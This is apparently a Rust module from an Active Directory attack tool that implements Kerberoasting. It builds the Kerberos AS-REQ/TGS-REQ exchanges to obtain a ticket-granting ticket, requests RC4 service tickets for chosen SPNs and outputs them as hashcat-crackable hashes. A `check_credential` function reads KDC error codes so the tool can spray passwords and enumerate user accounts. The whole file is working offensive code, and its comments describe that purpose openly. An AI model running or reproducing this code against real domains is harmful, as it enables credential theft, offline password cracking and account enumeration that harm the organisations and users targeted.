//! Kerberoast: authenticated TGS-REQ path.
//!
//! Flow (all etype negotiation done with AES256 for the *client* key, since modern DCs
//! store AES keys for users):
//!   1. `get_tgt` — AS-REQ **with** PA-ENC-TIMESTAMP (proves knowledge of the password),
//!      decrypt the AS-REP enc-part to recover the TGT session key + the TGT itself.
//!   2. `roast_spn` — build an AP-REQ (authenticator encrypted under the session key),
//!      wrap it in a TGS-REQ for the target SPN, and extract the returned *service
//!      ticket* enc-part — the crackable Kerberoast material.
//!
//! The TGS-REQ requests an RC4 service ticket (etype 23) so the result is the canonical
//! hashcat-13100 hash. AES-only service accounts return etype 18 and are reported as such.

use crate::{format_tgs, kdc_exchange, krb_string, now_kerberos_time, principal, ETYPE_RC4_HMAC};
use anyhow::{anyhow, bail, Result};

use picky_asn1::bit_string::BitString;
use picky_asn1::wrapper::{
    Asn1SequenceOf, BitStringAsn1, ExplicitContextTag0, ExplicitContextTag1, ExplicitContextTag2,
    ExplicitContextTag3, ExplicitContextTag4, ExplicitContextTag5, ExplicitContextTag7,
    ExplicitContextTag8, IntegerAsn1, OctetStringAsn1, Optional,
};
use picky_krb::constants::key_usages::{AS_REP_ENC, TGS_REQ_PA_DATA_AP_REQ_AUTHENTICATOR};
use picky_krb::constants::types::{
    AP_REQ_MSG_TYPE, AS_REQ_MSG_TYPE, NT_PRINCIPAL, NT_SRV_INST, PA_ENC_TIMESTAMP_KEY_USAGE,
    TGS_REQ_MSG_TYPE,
};
use picky_krb::crypto::{Cipher, CipherSuite};
use picky_krb::data_types::{
    Authenticator, AuthenticatorInner, EncryptedData, EtypeInfo2, PaData, PaEncTsEnc, PrincipalName,
    Ticket,
};
use picky_krb::messages::{
    ApReq, ApReqInner, AsRep, AsReq, EncAsRepPart, KdcReq, KdcReqBody, KrbError, TgsRep, TgsReq,
};

/// Ticket-Granting Ticket plus the material needed to use it.
pub struct Tgt {
    ticket: Ticket,
    session_key: Vec<u8>,
    cname: PrincipalName,
    crealm: String,
}

fn aes256() -> Box<dyn Cipher> {
    CipherSuite::Aes256CtsHmacSha196.cipher()
}

fn encrypted_data(etype: u8, cipher: Vec<u8>) -> EncryptedData {
    EncryptedData {
        etype: ExplicitContextTag0::from(IntegerAsn1(vec![etype])),
        kvno: Optional::from(None),
        cipher: ExplicitContextTag2::from(OctetStringAsn1(cipher)),
    }
}

fn kdc_options() -> BitStringAsn1 {
    // forwardable | renewable | canonicalize
    BitStringAsn1::from(BitString::with_bytes(vec![0x40, 0x81, 0x00, 0x00]))
}

fn nonce() -> IntegerAsn1 {
    let mut n = [0u8; 4];
    rand::RngCore::fill_bytes(&mut rand::thread_rng(), &mut n);
    n[0] &= 0x7f;
    IntegerAsn1(n.to_vec())
}

/// Build an AS-REQ for `user@realm` requesting AES256, optionally carrying pre-auth.
fn build_as_req(realm: &str, user: &str, padata: Option<PaData>) -> AsReq {
    let body = KdcReqBody {
        kdc_options: ExplicitContextTag0::from(kdc_options()),
        cname: Optional::from(Some(ExplicitContextTag1::from(principal(NT_PRINCIPAL, &[user])))),
        realm: ExplicitContextTag2::from(krb_string(realm)),
        sname: Optional::from(Some(ExplicitContextTag3::from(principal(NT_SRV_INST, &["krbtgt", realm])))),
        from: Optional::from(None),
        till: ExplicitContextTag5::from(crate::far_future_time()),
        rtime: Optional::from(None),
        nonce: ExplicitContextTag7::from(nonce()),
        etype: ExplicitContextTag8::from(Asn1SequenceOf::from(vec![IntegerAsn1(vec![crate::ETYPE_AES256])])),
        addresses: Optional::from(None),
        enc_authorization_data: Optional::from(None),
        additional_tickets: Optional::from(None),
    };
    let pa = padata.map(|p| ExplicitContextTag3::from(Asn1SequenceOf::from(vec![p])));
    AsReq::from(KdcReq {
        pvno: ExplicitContextTag1::from(IntegerAsn1(vec![5])),
        msg_type: ExplicitContextTag2::from(IntegerAsn1(vec![AS_REQ_MSG_TYPE])),
        padata: Optional::from(pa),
        req_body: ExplicitContextTag4::from(body),
    })
}

/// Pull the AES salt from a KRB-ERROR's ETYPE-INFO2 pre-auth hint; fall back to `default`.
fn extract_salt(err: &KrbError, default: &str) -> String {
    let Some(edata) = err.0.e_data.0.as_ref() else { return default.to_string() };
    let Ok(padatas) =
        picky_asn1_der::from_bytes::<picky_asn1::wrapper::Asn1SequenceOf<PaData>>(&edata.0 .0)
    else {
        return default.to_string();
    };
    for pa in padatas.0 {
        if pa.padata_type.0 .0 == vec![0x13] {
            // PA-ETYPE-INFO2
            if let Ok(info) = picky_asn1_der::from_bytes::<EtypeInfo2>(&pa.padata_data.0 .0) {
                for entry in info.0 {
                    if let Some(salt) = entry.salt.0.as_ref() {
                        return String::from_utf8_lossy(salt.0.as_bytes()).into_owned();
                    }
                }
            }
        }
    }
    default.to_string()
}

/// AS-REP roast a TGT via the two-step AS exchange: first an un-authenticated AS-REQ to
/// learn the real salt (ETYPE-INFO2), then an AS-REQ with PA-ENC-TIMESTAMP.
pub async fn get_tgt(user: &str, password: &str, realm: &str, kdc: &str) -> Result<Tgt> {
    let realm = realm.to_uppercase();
    let cipher = aes256();
    // The Kerberos client principal is the bare sAMAccountName — strip any UPN suffix
    // (user@realm) or NetBIOS prefix (DOMAIN\user) that came from the LDAP bind identity.
    let user = user.split('@').next().unwrap_or(user);
    let user = user.rsplit('\\').next().unwrap_or(user);
    let default_salt = format!("{realm}{user}");

    // Step 1 — no pre-auth: expect KRB-ERROR(25 = PREAUTH_REQUIRED) carrying ETYPE-INFO2.
    let raw1 = picky_asn1_der::to_vec(&build_as_req(&realm, user, None))
        .map_err(|e| anyhow!("encode AS-REQ#1: {e}"))?;
    let resp1 = kdc_exchange(kdc, &raw1).await?;
    let salt = if picky_asn1_der::from_bytes::<AsRep>(&resp1).is_ok() {
        default_salt.clone() // pre-auth not required (rare)
    } else {
        match picky_asn1_der::from_bytes::<KrbError>(&resp1) {
            Ok(err) => {
                let code = err.0.error_code.0;
                if code != 25 {
                    bail!("KDC error {code} on initial AS-REQ");
                }
                extract_salt(&err, &default_salt)
            }
            Err(e) => bail!("unexpected AS response: {e}"),
        }
    };

    let key = cipher
        .generate_key_from_password(password.as_bytes(), salt.as_bytes())
        .map_err(|e| anyhow!("derive AES key: {e}"))?;

    // Step 2 — AS-REQ with PA-ENC-TIMESTAMP encrypted under the derived key.
    let ts = PaEncTsEnc {
        patimestamp: ExplicitContextTag0::from(now_kerberos_time()),
        pausec: Optional::from(None),
    };
    let ts_der = picky_asn1_der::to_vec(&ts).map_err(|e| anyhow!("encode PA-TS: {e}"))?;
    let enc_ts = cipher
        .encrypt(&key, PA_ENC_TIMESTAMP_KEY_USAGE, &ts_der)
        .map_err(|e| anyhow!("encrypt PA-TS: {e}"))?;
    let padata = PaData {
        padata_type: ExplicitContextTag1::from(IntegerAsn1(vec![0x02])),
        padata_data: ExplicitContextTag2::from(OctetStringAsn1(
            picky_asn1_der::to_vec(&encrypted_data(crate::ETYPE_AES256, enc_ts))
                .map_err(|e| anyhow!("encode PA-TS ED: {e}"))?,
        )),
    };
    let raw2 = picky_asn1_der::to_vec(&build_as_req(&realm, user, Some(padata)))
        .map_err(|e| anyhow!("encode AS-REQ#2: {e}"))?;
    let resp2 = kdc_exchange(kdc, &raw2).await?;
    let as_rep: AsRep = picky_asn1_der::from_bytes(&resp2).map_err(|e| {
        match picky_asn1_der::from_bytes::<KrbError>(&resp2) {
            Ok(err) => anyhow!("pre-auth AS-REQ rejected, KDC error {}", err.0.error_code.0),
            Err(_) => anyhow!("AS-REP decode: {e}"),
        }
    })?;

    let enc = &as_rep.0.enc_part.0;
    let plain = cipher
        .decrypt(&key, AS_REP_ENC, &enc.cipher.0 .0)
        .map_err(|e| anyhow!("decrypt AS-REP: {e}"))?;
    let enc_part: EncAsRepPart =
        picky_asn1_der::from_bytes(&plain).map_err(|e| anyhow!("EncAsRepPart decode: {e}"))?;
    let session_key = enc_part.0.key.0.key_value.0 .0.clone();

    Ok(Tgt {
        ticket: as_rep.0.ticket.0.clone(),
        session_key,
        cname: as_rep.0.cname.0.clone(),
        crealm: realm,
    })
}

/// Outcome of a Kerberos pre-auth credential check (password spray / user enum).
#[derive(Clone, Copy, Debug, PartialEq, Eq)]
pub enum CredResult {
    Valid,          // AS-REP returned — password correct
    ValidButExpired, // correct password, must change (KEY_EXPIRED)
    Invalid,        // PREAUTH_FAILED — wrong password
    Disabled,       // CLIENT_REVOKED — locked/disabled/expired account
    NoPreAuth,      // DONT_REQ_PREAUTH — AS-REP roastable, password not verifiable this way
    NoSuchUser,     // C_PRINCIPAL_UNKNOWN — account does not exist
    Other(u32),
}

/// Validate one credential via a Kerberos AS pre-auth exchange (no LDAP needed). The KDC
/// error code classifies the result — the basis for password spraying and user enumeration.
pub async fn check_credential(user: &str, password: &str, realm: &str, kdc: &str) -> Result<CredResult> {
    let realm = realm.to_uppercase();
    let cipher = aes256();
    let user = user.split('@').next().unwrap_or(user);
    let user = user.rsplit('\\').next().unwrap_or(user);
    let default_salt = format!("{realm}{user}");

    // Step 1 — no pre-auth: classify by response.
    let raw1 = picky_asn1_der::to_vec(&build_as_req(&realm, user, None))
        .map_err(|e| anyhow!("encode AS-REQ#1: {e}"))?;
    let resp1 = kdc_exchange(kdc, &raw1).await?;
    if picky_asn1_der::from_bytes::<AsRep>(&resp1).is_ok() {
        return Ok(CredResult::NoPreAuth); // pre-auth not required for this account
    }
    let salt = match picky_asn1_der::from_bytes::<KrbError>(&resp1) {
        Ok(err) => match err.0.error_code.0 {
            25 => extract_salt(&err, &default_salt), // PREAUTH_REQUIRED — normal
            6 => return Ok(CredResult::NoSuchUser),
            c => return Ok(CredResult::Other(c)),
        },
        Err(e) => bail!("unexpected AS response: {e}"),
    };

    // Step 2 — pre-auth with the candidate password.
    let key = cipher
        .generate_key_from_password(password.as_bytes(), salt.as_bytes())
        .map_err(|e| anyhow!("derive key: {e}"))?;
    let ts = PaEncTsEnc {
        patimestamp: ExplicitContextTag0::from(now_kerberos_time()),
        pausec: Optional::from(None),
    };
    let enc_ts = cipher
        .encrypt(&key, PA_ENC_TIMESTAMP_KEY_USAGE, &picky_asn1_der::to_vec(&ts).unwrap())
        .map_err(|e| anyhow!("encrypt PA-TS: {e}"))?;
    let padata = PaData {
        padata_type: ExplicitContextTag1::from(IntegerAsn1(vec![0x02])),
        padata_data: ExplicitContextTag2::from(OctetStringAsn1(
            picky_asn1_der::to_vec(&encrypted_data(crate::ETYPE_AES256, enc_ts)).unwrap(),
        )),
    };
    let raw2 = picky_asn1_der::to_vec(&build_as_req(&realm, user, Some(padata)))
        .map_err(|e| anyhow!("encode AS-REQ#2: {e}"))?;
    let resp2 = kdc_exchange(kdc, &raw2).await?;

    if picky_asn1_der::from_bytes::<AsRep>(&resp2).is_ok() {
        return Ok(CredResult::Valid);
    }
    Ok(match picky_asn1_der::from_bytes::<KrbError>(&resp2) {
        Ok(err) => match err.0.error_code.0 {
            24 => CredResult::Invalid,        // PREAUTH_FAILED
            18 => CredResult::Disabled,       // CLIENT_REVOKED
            23 => CredResult::ValidButExpired, // KEY_EXPIRED
            6 => CredResult::NoSuchUser,
            c => CredResult::Other(c),
        },
        Err(_) => CredResult::Other(0),
    })
}

/// Build a TGS-REQ for `spn` using the TGT, and return the crackable service-ticket hash.
pub async fn roast_spn(tgt: &Tgt, sam: &str, spn: &str, kdc: &str) -> Result<String> {
    let session = aes256();

    // Authenticator, encrypted under the TGT session key (usage 7).
    let authenticator = Authenticator::from(AuthenticatorInner {
        authenticator_bno: ExplicitContextTag0::from(IntegerAsn1(vec![5])),
        crealm: ExplicitContextTag1::from(krb_string(&tgt.crealm)),
        cname: ExplicitContextTag2::from(tgt.cname.clone()),
        cksum: Optional::from(None),
        cusec: ExplicitContextTag4::from(IntegerAsn1(vec![0])),
        ctime: ExplicitContextTag5::from(now_kerberos_time()),
        subkey: Optional::from(None),
        seq_number: Optional::from(None),
        authorization_data: Optional::from(None),
    });
    let auth_der = picky_asn1_der::to_vec(&authenticator).map_err(|e| anyhow!("encode authenticator: {e}"))?;
    let enc_auth = session
        .encrypt(&tgt.session_key, TGS_REQ_PA_DATA_AP_REQ_AUTHENTICATOR, &auth_der)
        .map_err(|e| anyhow!("encrypt authenticator: {e}"))?;

    // AP-REQ carrying the TGT + encrypted authenticator.
    let ap_req = ApReq::from(ApReqInner {
        pvno: ExplicitContextTag0::from(IntegerAsn1(vec![5])),
        msg_type: ExplicitContextTag1::from(IntegerAsn1(vec![AP_REQ_MSG_TYPE])),
        ap_options: ExplicitContextTag2::from(BitStringAsn1::from(BitString::with_bytes(vec![0, 0, 0, 0]))),
        ticket: ExplicitContextTag3::from(tgt.ticket.clone()),
        authenticator: ExplicitContextTag4::from(encrypted_data(crate::ETYPE_AES256, enc_auth)),
    });
    let ap_der = picky_asn1_der::to_vec(&ap_req).map_err(|e| anyhow!("encode AP-REQ: {e}"))?;
    let pa_tgs = PaData {
        padata_type: ExplicitContextTag1::from(IntegerAsn1(vec![0x01])), // PA-TGS-REQ
        padata_data: ExplicitContextTag2::from(OctetStringAsn1(ap_der)),
    };

    // SPN → sname (split service class / instance on '/').
    let parts: Vec<&str> = spn.split('/').collect();
    let sname = principal(NT_SRV_INST, &parts);

    let body = KdcReqBody {
        kdc_options: ExplicitContextTag0::from(kdc_options()),
        cname: Optional::from(None), // identity comes from the ticket
        realm: ExplicitContextTag2::from(krb_string(&tgt.crealm)),
        sname: Optional::from(Some(ExplicitContextTag3::from(sname))),
        from: Optional::from(None),
        till: ExplicitContextTag5::from(crate::far_future_time()),
        rtime: Optional::from(None),
        nonce: ExplicitContextTag7::from(nonce()),
        // Prefer an RC4 service ticket ⇒ hashcat 13100.
        etype: ExplicitContextTag8::from(Asn1SequenceOf::from(vec![IntegerAsn1(vec![ETYPE_RC4_HMAC])])),
        addresses: Optional::from(None),
        enc_authorization_data: Optional::from(None),
        additional_tickets: Optional::from(None),
    };
    let tgs_req = TgsReq::from(KdcReq {
        pvno: ExplicitContextTag1::from(IntegerAsn1(vec![5])),
        msg_type: ExplicitContextTag2::from(IntegerAsn1(vec![TGS_REQ_MSG_TYPE])),
        padata: Optional::from(Some(ExplicitContextTag3::from(Asn1SequenceOf::from(vec![pa_tgs])))),
        req_body: ExplicitContextTag4::from(body),
    });

    let raw = picky_asn1_der::to_vec(&tgs_req).map_err(|e| anyhow!("encode TGS-REQ: {e}"))?;
    let resp = kdc_exchange(kdc, &raw).await?;
    let tgs_rep: TgsRep = picky_asn1_der::from_bytes(&resp)
        .map_err(|e| anyhow!("TGS-REP decode (KDC error): {e}"))?;

    // The crackable material is the *service ticket* enc-part.
    let tkt_enc = &tgs_rep.0.ticket.0 .0.enc_part.0;
    let etype = tkt_enc.etype.0 .0.iter().fold(0u32, |a, &b| (a << 8) | b as u32);
    let cipher = &tkt_enc.cipher.0 .0;
    // RC4 (23) → hashcat 13100; AES128/256 (17/18) → hashcat 19600/19700.
    Ok(if etype == ETYPE_RC4_HMAC as u32 {
        format_tgs(sam, &tgt.crealm, spn, cipher)
    } else {
        crate::format_tgs_aes(sam, &tgt.crealm, spn, etype as u8, cipher)
    })
}
